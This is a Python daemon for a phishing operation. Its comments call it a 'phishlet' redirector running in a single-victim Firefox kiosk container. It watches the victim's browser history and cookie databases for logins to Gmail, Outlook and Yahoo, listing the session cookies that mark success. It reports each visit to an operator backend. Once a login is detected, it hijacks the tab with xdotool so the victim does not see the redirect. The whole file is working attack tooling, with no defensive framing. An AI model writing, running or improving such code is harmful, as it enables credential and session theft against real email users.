#!/usr/bin/env python3
"""Multi-phishlet URL tracker and login-redirect daemon.

Runs inside a Firefox container (one per phishlet).  Every ~2s it
asks Firefox what URL the active tab is on, classifies it as one of
    {gmail, outlook, yahoo}, reports the visit to the
backend, and once a successful login is detected (URL pattern + auth
cookies present in cookies.sqlite) it triggers a redirect to the
operator-supplied URL via xdotool.

Phishlet definitions live in PHISHLETS at the bottom of the file.
"""
import json
import os
import re
import sqlite3
import subprocess
import sys
import time
import urllib.request
import urllib.error

LOG = "/config/log/phishlet-redirector.log"
COOKIE_DB_CANDIDATES = [
    "/config/profile/cookies.sqlite",
    "/config/profile-default/cookies.sqlite",
]
BACKEND = os.environ.get("BACKEND_URL", "http://backend:8000")
POLL_INTERVAL = 2.0
NAV_TIMEOUT = 90  # seconds; stop checking if no login within this long


# ---------------------------------------------------------------------------
# Phishlet definitions
# ---------------------------------------------------------------------------
PHISHLETS = {
    "gmail": {
        "url_hosts": ("mail.google.com", "accounts.google.com"),
        "logged_in_url_re": re.compile(
            r"^https://mail\.google\.com/mail/.*"
        ),
        "auth_cookies": ("SID", "HSID", "SSID", "APISID", "SAPISID", "OSID"),
    },
    "outlook": {
        "url_hosts": ("outlook.live.com", "login.live.com", "login.microsoftonline.com"),
        "logged_in_url_re": re.compile(
            r"^https://outlook\.live\.com/mail/.*"
        ),
        "auth_cookies": ("OutlookIdentity", "OutlookSession", "RPSSecAuth", "MSPAuth"),
    },
    "yahoo": {
        "url_hosts": ("mail.yahoo.com", "login.yahoo.com", "yahoo.com"),
        "logged_in_url_re": re.compile(
            r"^https://(mail\.|login\.)?yahoo\.com/(?!login|signup)(.*)"
        ),
        "auth_cookies": ("T", "Y"),
    },
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------
def log(msg):
    try:
        os.makedirs(os.path.dirname(LOG), exist_ok=True)
        with open(LOG, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] {msg}\n")
    except Exception:
        pass


def http_get_json(path, timeout=5):
    try:
        with urllib.request.urlopen(f"{BACKEND}{path}", timeout=timeout) as r:
            return json.loads(r.read())
    except Exception as e:
        log(f"GET {path}: {e}")
        return None


def http_post_json(path, payload, timeout=5):
    try:
        body = json.dumps(payload).encode("utf-8")
        req = urllib.request.Request(
            f"{BACKEND}{path}",
            data=body,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.read()
    except Exception as e:
        log(f"POST {path} {payload}: {e}")
        return None


def find_cookie_db():
    for p in COOKIE_DB_CANDIDATES:
        if os.path.isfile(p):
            return p
    try:
        result = subprocess.run(
            ["find", "/config", "-name", "cookies.sqlite", "-type", "f", "-maxdepth", "4"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                return line
    except Exception as e:
        log(f"find cookies: {e}")
    return None


PLACES_DB_CANDIDATES = [
    "/config/profile/places.sqlite",
    "/config/profile-default/places.sqlite",
]


def find_places_db():
    for p in PLACES_DB_CANDIDATES:
        if os.path.isfile(p):
            return p
    try:
        result = subprocess.run(
            ["find", "/config", "-name", "places.sqlite", "-type", "f", "-maxdepth", "4"],
            capture_output=True, text=True, timeout=5,
        )
        for line in result.stdout.splitlines():
            line = line.strip()
            if line:
                return line
    except Exception as e:
        log(f"find places: {e}")
    return None


def check_auth_cookies(cookie_db, auth_cookie_names):
    """Return set of auth cookie names present in the cookies DB.

    Firefox keeps cookies.sqlite locked in WAL mode while the browser is
    running, which makes sqlite3.connect() throw 'database is locked' on
    Linux.  Workaround: copy the DB (and its -wal/-shm sidecars) to a
    temp file and read from the copy.  The copy is read-only-safe.
    """
    if not cookie_db or not auth_cookie_names:
        return set()
    tmp = f"/tmp/cookies-copy-{os.getpid()}.sqlite"
    try:
        # Copy the main DB plus WAL/SHM sidecars so the copy is consistent
        for ext in ("", "-wal", "-shm"):
            src = cookie_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        placeholders = ",".join("?" for _ in auth_cookie_names)
        cur.execute(
            f"SELECT DISTINCT name FROM moz_cookies WHERE name IN ({placeholders})",
            auth_cookie_names,
        )
        present = {row[0] for row in cur.fetchall()}
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        return present
    except sqlite3.OperationalError as e:
        log(f"cookies DB read error: {e}")
        return set()
    except Exception as e:
        log(f"cookies DB read error: {e}")
        return set()


def get_current_url(places_db):
    """Read the current Firefox URL from the history DB (places.sqlite).

    We can't use xdotool/Ctrl-L because it steals focus from the user.
    Firefox 145 doesn't expose a Chrome-style /json endpoint over its
    remote-debugging-port.  The cleanest non-intrusive option is to read
    moz_places.moz_historyvisits, which Firefox updates on every
    navigation.  For a single-victim kiosk container, the most-recent
    visit is the current tab.
    """
    if not places_db:
        return None
    tmp = f"/tmp/places-copy-{os.getpid()}-{int(time.time())}.sqlite"
    try:
        for ext in ("", "-wal", "-shm"):
            src = places_db + ext
            if os.path.isfile(src):
                with open(src, "rb") as f_in, open(tmp + ext, "wb") as f_out:
                    f_out.write(f_in.read())
        con = sqlite3.connect(tmp, timeout=2)
        cur = con.cursor()
        # Most recent navigation's URL
        try:
            cur.execute("""
                SELECT p.url
                FROM moz_historyvisits v
                JOIN moz_places p ON p.id = v.place_id
                WHERE p.url LIKE 'http%'
                ORDER BY v.id DESC
                LIMIT 1
            """)
            row = cur.fetchone()
        except sqlite3.OperationalError as e:
            # Schema not yet populated (Firefox hasn't visited anything)
            row = None
        con.close()
        for ext in ("", "-wal", "-shm"):
            try:
                os.unlink(tmp + ext)
            except OSError:
                pass
        if row:
            return row[0]
    except sqlite3.OperationalError as e:
        log(f"places DB read error: {e}")
    except Exception as e:
        log(f"places DB read error: {e}")
    return None


def classify_url(url):
    """Return phishlet key if URL matches one of the PHISHLETS, else None."""
    if not url:
        return None
    for key, cfg in PHISHLETS.items():
        for host in cfg["url_hosts"]:
            if host in url:
                return key
    return None


def is_logged_in(phishlet_key, url, auth_present):
    if not auth_present:
        return False
    if not url:
        return False
    return bool(PHISHLETS[phishlet_key]["logged_in_url_re"].match(url))


def get_redirect_url(phishlet_key):
    data = http_get_json(f"/api/phishlets/redirect-url?key={phishlet_key}")
    if data and data.get("url"):
        return data["url"]
    return os.environ.get("REDIRECT_URL", "").strip() or None


def send_visit(phishlet_key, url):
    http_post_json(
        "/api/phishlets/visit",
        {"phishletKey": phishlet_key, "currentUrl": url},
    )


def navigate(url):
    """Navigate the current Firefox tab to the redirect URL via xdotool.

    Uses clipboard paste instead of typing so the victim never sees
    the URL being entered character-by-character in the address bar.
    """
    try:
        result = subprocess.run(
            ["xdotool", "search", "--class", "firefox"],
            capture_output=True, text=True, timeout=5,
        )
        wids = [w for w in result.stdout.split() if w]
        if not wids:
            log("navigate: no Firefox window")
            return False
        wid = wids[-1]
        subprocess.run(["xdotool", "windowactivate", "--sync", wid], timeout=5)
        time.sleep(0.1)
        # Put the URL into the clipboard, then paste it instantly
        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+l"], timeout=3)
        time.sleep(0.1)
        subprocess.run(["xclip", "-selection", "clipboard"], input=url.encode(), timeout=3)
        subprocess.run(["xdotool", "key", "--clearmodifiers", "ctrl+v"], timeout=3)
        time.sleep(0.1)
        subprocess.run(["xdotool", "key", "--clearmodifiers", "Return"], timeout=3)
        log(f"navigate: redirected current tab to {url}")
        return True
    except Exception as e:
        log(f"navigate error: {e}")
        return False


# ---------------------------------------------------------------------------
# Main loop
# ---------------------------------------------------------------------------
def main():
    log(f"phishlet-redirector starting (backend={BACKEND})")
    cookie_db = None
    for _ in range(60):
        cookie_db = find_cookie_db()
        if cookie_db:
            break
        time.sleep(1)
    if not cookie_db:
        log("cookies.sqlite not found, exiting")
        sys.exit(1)
    log(f"using cookies DB: {cookie_db}")

    places_db = find_places_db()
    if places_db:
        log(f"using places DB: {places_db}")
    else:
        log("places.sqlite not found yet - will keep looking")

    last_url = {}
    last_logged_in = {}
    started = time.time()

    while True:
        if not places_db:
            places_db = find_places_db()
            if places_db:
                log(f"places DB now available: {places_db}")
        url = get_current_url(places_db)
        phishlet_key = classify_url(url)
        if phishlet_key:
            cfg = PHISHLETS[phishlet_key]
            auth = check_auth_cookies(cookie_db, cfg["auth_cookies"])
            logged_in = is_logged_in(phishlet_key, url, auth)
            prev_url = last_url.get(phishlet_key)
            prev_logged_in = last_logged_in.get(phishlet_key, False)

            if url != prev_url:
                log(f"[{phishlet_key}] visit {url} auth={sorted(auth)}")
                send_visit(phishlet_key, url)
                last_url[phishlet_key] = url

            if logged_in and not prev_logged_in:
                log(f"[{phishlet_key}] LOGIN detected at {url}")
                send_visit(phishlet_key, url)
                target = get_redirect_url(phishlet_key)
                if target:
                    log(f"[{phishlet_key}] redirected current tab to {target}")
                    navigate(target)
                else:
                    log(f"[{phishlet_key}] no redirect URL configured")

            last_logged_in[phishlet_key] = logged_in
        else:
            # Not a phishlet URL (maybe about:config, blank tab, etc.) - skip
            pass

        if time.time() - started > NAV_TIMEOUT:
            # Reset timer so we keep monitoring if a new session starts
            started = time.time()

        time.sleep(POLL_INTERVAL)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)
    except Exception as e:
        log(f"FATAL: {e}")
        sys.exit(1)
